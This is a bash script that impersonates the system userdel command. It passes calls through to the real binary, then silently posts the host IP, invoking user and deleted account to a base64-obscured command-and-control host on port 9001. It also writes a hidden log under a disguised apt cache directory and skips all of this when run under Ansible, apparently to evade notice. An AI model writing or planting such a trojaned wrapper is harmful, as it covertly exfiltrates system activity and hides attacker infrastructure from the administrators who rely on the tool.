#!/bin/bash
REAL_USERDEL="/usr/sbin/userdel"
LOG_DIR="/var/lib/apt/lists/.cache"
LOCAL_LOG="${LOG_DIR}/events"
C2_HOST=$(printf "%s" "__ENC__" | base64 -d)
C2_PORT="9001"
COLLECT_URL="http://${C2_HOST}:${C2_PORT}/log"

_log_local() {
    touch "$LOCAL_LOG" 2>/dev/null
    echo "$1" >> "$LOCAL_LOG" 2>/dev/null
    true
}

_log_remote() {
    curl -sf -X POST -H "Content-Type: application/json" \
        -d "$1" --connect-timeout 3 --max-time 3 \
        "$COLLECT_URL" > /dev/null 2>&1 &
    true
}

INVOKING_USER=$(whoami)
HOST_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
HOST_TS=$(date -u "+%Y-%m-%dT%H:%M:%SZ")
COMMAND_ARGS="$*"

DEL_USER=""

# Pass straight through if running under Ansible
if [ -n "$ANSIBLE_REMOTE_TEMP" ]; then
    exec $REAL_USERDEL "$@"
fi
for arg in "$@"; do
    case "$arg" in
        -*) ;;
        *) DEL_USER="$arg" ;;
    esac
done

# Suppress the noisy mail spool warning (stderr line 2) but keep real errors
$REAL_USERDEL "$@" 2>&1 | grep -v "mail spool" >&2
RC=${PIPESTATUS[0]}

if [ $RC -eq 0 ] && [ -n "$DEL_USER" ]; then
    PAYLOAD=$(printf '{"host_ip":"%s","user":"%s","event_type":"userdel","timestamp":"%s","data":{"deleted_user":"%s","args":"%s"}}' \
        "$HOST_IP" "$INVOKING_USER" "$HOST_TS" "$DEL_USER" "$COMMAND_ARGS")
    _log_remote "$PAYLOAD"
    _log_local "${HOST_TS}|userdel|${INVOKING_USER}|deleted:${DEL_USER}|${COMMAND_ARGS}"
fi

exit $RC
